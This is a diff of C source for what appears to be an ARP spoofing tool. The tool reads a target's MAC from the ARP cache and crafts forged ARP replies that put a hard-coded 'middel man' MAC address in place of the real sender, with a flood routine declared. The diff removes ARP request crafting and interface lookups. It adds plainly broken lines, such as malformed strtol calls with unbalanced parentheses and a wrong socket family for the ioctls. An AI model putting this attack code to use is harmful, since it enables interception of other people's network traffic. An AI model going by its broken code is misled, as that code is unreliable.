@@ -1,12 +1,10 @@
 #include <stdio.h>
-#include <stdlib.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <string.h>
 #include <errno.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
-#include <arpa/inet.h>
 #include <linux/if_packet.h>
 // #include <netinet/ether.h>
 
@@ -63,8 +61,6 @@ void decodeARP(unsigned char *buf, ARP_Packet *arp , int debug);
 void writeToFile(unsigned char *data, int len,unsigned char *fileName);
 void getTargetInfo(unsigned char *target);
 int  find(char *buffer, char *pattern, int len);
-void craftArpRequestPayload(unsigned char *targetIP);
-
 void flood();
 
 //Globel Var
@@ -77,10 +73,8 @@ int interface_index = 0;
 
 //Ip char buffer
 unsigned char target [15]; //i.g 192.150.160.10   
-unsigned char target_bin[4]; // ip in binary formate
 unsigned char target_mac [6];
-unsigned char mask [15];  //i.g 192.150.160.101   
-unsigned char mask_bin[4]; // ip in binary formate
+unsigned char mask [15];   
 
 
 LL_SockAddr ll_sock_disc;
@@ -89,14 +83,10 @@ ARP_Packet arp_packet, arp_packet_replay;
 const int TARGET = 71; //152;
 // T-mac : D0:17:C2:9C:42:28
 
-unsigned char broadcast_Add[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-unsigned char zero_Add[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
 //Mask src addrs
 unsigned char srcAddr[6] = {0xd0, 0x17, 0xc2, 0x9c, 0x42, 0x28};
-unsigned char own_mac_Add[6] = {0x9c,0x5c,0x8e,0x8e,0x6e,0xbe}; //middel man
-unsigned char own_ip_Add[4];
-
-unsigned char ipAdd[4]   =  {0xC0,0xA8,0x01,0x98}; //152 
+unsigned char mcD[6]     = {0x9c,0x5c,0x8e,0x8e,0x6e,0xbe}; //middel man
+unsigned char ipAdd[4]   =  {0xC0,0xA8,0x01,0x98};
 
 
 
@@ -157,7 +147,7 @@ void deploy(){
 void craftPayload(){
     
     //eth header
-      memcpy(eth_replay.src_addr, own_mac_Add, 6);
+      memcpy(eth_replay.src_addr, mcD, 6);
       memcpy(eth_replay.dst_addr, eth.src_addr, 6);
       eth_replay.type = eth.type;
 
@@ -167,9 +157,9 @@ void craftPayload(){
       arp_packet_replay.OPER[1] = 0x02; //Replay byte
       
       //Middel man 
-      memcpy(arp_packet_replay.SHA_2 , own_mac_Add, 2);
-      memcpy(arp_packet_replay.SHA_4 , &own_mac_Add[2], 2);
-      memcpy(arp_packet_replay.SHA_6 , &own_mac_Add[4], 2);
+      memcpy(arp_packet_replay.SHA_2 , mcD, 2);
+      memcpy(arp_packet_replay.SHA_4 , &mcD[2], 2);
+      memcpy(arp_packet_replay.SHA_6 , &mcD[4], 2);
 
       memcpy(arp_packet_replay.SPA_2 , arp_packet.TPA_2, 2);
       memcpy(arp_packet_replay.SPA_4 , arp_packet.TPA_4, 2);
@@ -247,23 +237,15 @@ void main(){
  if(mode == 1){
    printf("\nTarget src =>");
    scanf("%s",target);
-
-   //convert string ip to network formate *binary ip
-   struct sockaddr_in saddr_ip;
-   inet_pton(AF_INET, target, &saddr_ip.sin_addr);
-   memcpy(target_bin, &saddr_ip.sin_addr, 4);
-   printf("\n Target src binary to string ipv4 =>%d.%d.%d.%d",(int)target_bin[0],(int)target_bin[1],(int)target_bin[2],(int)target_bin[3]); //debug
-   
    printf("\nTarget dst =>");
    scanf("%s",mask);
-   
-   //convert string ip to network formate *binary ip
-   inet_pton(AF_INET, mask, &saddr_ip.sin_addr);
-   memcpy(mask_bin, &saddr_ip.sin_addr, 4);
-   printf("\n Target dst binary to string ipv4 =>%d.%d.%d.%d",(int)mask_bin[0],(int)mask_bin[1],(int)mask_bin[2],(int)mask_bin[3]); //debug
-   
 
    getTargetInfo(target);
+   //craftPayload();
+   //deployPAyload();
+   
+   //rerouting done
+   
   }
 
  else{
@@ -313,48 +295,23 @@ void main(){
 //Get interface index & info
 void getInterface(){
      
-    unsigned char ifName[]={'e','n','p','3','s','0'};  
+    unsigned char ifName[6]={'e','n','p','3','s','0'};  
                              // enp3s0
     struct ifreq ifr;
     memcpy(ifr.ifr_name, ifName, sizeof(ifName));
 
-    int fd = socket(AF_INET,SOCK_DGRAM,0);
+    int fd = socket(AF_UNIX,SOCK_DGRAM,0);
     if(fd != -1){
        
        if(ioctl(fd, SIOCGIFINDEX, &ifr) != -1 ){
           printf("\n Enterface :%s index :%d",ifName, ifr.ifr_ifindex);
           interface_index = ifr.ifr_ifindex;
        }
-       else{
-        printf("\n get interface ioclt failed ...%d \n",errno);
-        exit(0);
-        }
-    
-       if(ioctl(fd, SIOCGIFHWADDR, &ifr) != -1){
-        memcpy(own_mac_Add, ifr.ifr_hwaddr.sa_data, 6); 
-        printf("\n Enterface :%s mac =>%0x:%0x:%0x:%0x:%0x:%0x",ifName,own_mac_Add[0],own_mac_Add[1],own_mac_Add[2],own_mac_Add[3],own_mac_Add[4],own_mac_Add[5]);
-       }
-       else{
-       printf("\n get interface ioclt failed ...%d \n",errno);
-       exit(0);
-       }
-     
-       if(ioctl(fd, SIOCGIFADDR, &ifr) != -1){
-
-        struct sockaddr_in *ipAddr = (struct sockaddr_in *) &ifr.ifr_addr;
-        struct in_addr *inAddr     = (struct in_addr *) &ipAddr->sin_addr;
-        memcpy(own_ip_Add, &inAddr->s_addr, 4);
-        printf("\n Enterface :%s ipv4 =>%d.%d.%d.%d",ifName,(int)own_ip_Add[0],(int)own_ip_Add[1],(int)own_ip_Add[2],(int)own_ip_Add[3]);
-       }
-       else{
-        printf("\n get interface ioctl failed ...%d \n",errno);
-        exit(0);
-       }
-  
+       else
+        printf("\n get interface ioclt failed ...%d",errno);  
     }
-    else{
-     printf("\n get interface info sock creation failed ...%d \n",errno);
-     exit(0);}
+    else
+     printf("\n get interface info sock creation failed ...%d",errno);
 
     
 }
@@ -419,44 +376,44 @@ void getTargetInfo(unsigned char * target){
     
     FILE *arpCache = fopen(ARP_TABEL, "r");
     if(arpCache!=NULL){
-      unsigned char buffe[80]; // 79
+      unsigned char buffe[79];
       char c;
       int i = 0;
       int targetFound = 0;
       do{
           //buffe[i] = (char)fgetc(arpCache);
-          //printf("\n i :%d",i); 
-          buffe[i] = c =(char)fgetc(arpCache);
-          // printf("\n arp Cache len =>%c, hex :%x  i =>%d",buffe[i], buffe[i], i);
+          buffe[i] =(char)fgetc(arpCache);
+        //   printf("\n arp Cache len =>%c, hex :%x  i =>%d",buffe[i], buffe[i], i);
           i++;
 
           if( 0xa == buffe[i-1]){ // on new line
-               i = 0;     
-             // find target in buffer
-             // printf("\n\nfinding Target ......... i :%d",i);
-               if( find(buffe,target,15) ){
-               printf("\n Target found in Arp tabel.");
-               targetFound = 1;
-             // get target mac
-               target_mac[0] = strtol(&buffe[41],NULL,16);
-               target_mac[1] = strtol(&buffe[44],NULL,16);
-               target_mac[2] = strtol(&buffe[47],NULL,16);
-               target_mac[3] = strtol(&buffe[50],NULL,16);
-               target_mac[4] = strtol(&buffe[53],NULL,16);
-               target_mac[5] = strtol(&buffe[56],NULL,16);
+            i = 0;   
+            //find target in buffer
+            if( find(buffe,target,15) ){
+             printf("\n Target found in Arp tabel.");
+             targetFound = 1;
+             //get target mac
+             target_mac[0] = strtol(buffe[41],NULL,16);
+             target_mac[1] =strtol 
+(buffe[43];
+             target_mac[2] =strtol (buffe[45];
+             target_mac[3] =strtol (buffe[47];
+             target_mac[4] =strtol (buffe[49];
+             target_mac[5] =strtol (buffe[51];
 
-               printf("\n Target Mac => %02X:%02X:%02X:%02X:%02X:%02X",target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5]);
+             //printf("\n Target Mac => %02X:%02X:%02X:%02X:%02X:%02X",target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5]);
             }
+          
           }
       }
-      while( c != EOF && !targetFound);
+      while(buffe[i-1] != EOF && !targetFound);
 
       //
       if(!targetFound){
        //boradcast arp request
        printf("\n Target Not found in ARP Tabel.");
       }
-
+      
     }
 
     //requerst target mac
@@ -466,7 +423,7 @@ void getTargetInfo(unsigned char * target){
 //Patern Match
 int find(char *buffer, char *pattern, int len){
    for(int i=0; i<len; i++){
-      //printf("\n matcheing => %c == %c",buffer[i],pattern[i]); //Debug
+      //printf("\n matcheing => %02X == %02X",buffer[i],pattern[i]); //Debug
        if(buffer[i] != pattern[i] && buffer[i] != 0x20){
           return 0;
          }
@@ -475,46 +432,3 @@ int find(char *buffer, char *pattern, int len){
 } 
 
 
-//Craft ARP request payload
-void craftArpRequestPayload(unsigned char *targetIP){
-  //eth header
-      memcpy(eth_replay.src_addr, own_mac_Add, 6);
-      memcpy(eth_replay.dst_addr, broadcast_Add, 6);
-      eth_replay.type =  0x0806;
-      
-    //Arp Header
-      arp_packet_replay.HTYPE[0] = 0x00;
-      arp_packet_replay.HTYPE[1] = 0x01;
-      arp_packet_replay.PTYPE[0] = 0x00;
-      arp_packet_replay.PTYPE[1] = 0x08;
-      
-      arp_packet_replay.HLEN[0]  = 0x06; // Hardware address len
-      arp_packet_replay.PLEN[0]  = 0x04; // Protocol address len 
-
-      arp_packet_replay.OPER[0] = 0x00;
-      arp_packet_replay.OPER[1] = 0x01; //Request byte
-      
-      //src
-      memcpy(arp_packet_replay.SHA_2 , own_mac_Add, 2);
-      memcpy(arp_packet_replay.SHA_4 , &own_mac_Add[2], 2);
-      memcpy(arp_packet_replay.SHA_6 , &own_mac_Add[4], 2);
-
-      memcpy(arp_packet_replay.SPA_2 , arp_packet.TPA_2, 2);
-      memcpy(arp_packet_replay.SPA_4 , arp_packet.TPA_4, 2);
-
-      //Destination 
-      memcpy(arp_packet_replay.THA_2, &zero_Add, 2);
-      memcpy(arp_packet_replay.THA_4, &zero_Add[2], 2);
-      memcpy(arp_packet_replay.THA_6, &zero_Add[4], 2);
-      
-      arp_packet_replay.TPA_2[0] = 0x0;
-      arp_packet_replay.TPA_2[1] = 0x0;
-      arp_packet_replay.TPA_4[0] = 0x0;
-      arp_packet_replay.TPA_4[1] = 0x0;
-
-     // memcpy(arp_packet_replay.TPA_2, arp_packet.SPA_2, 2);
-     // memcpy(arp_packet_replay.TPA_4, arp_packet.SPA_4, 2);        
-
-      printf("\nPayload Crafted ...");
-
-}
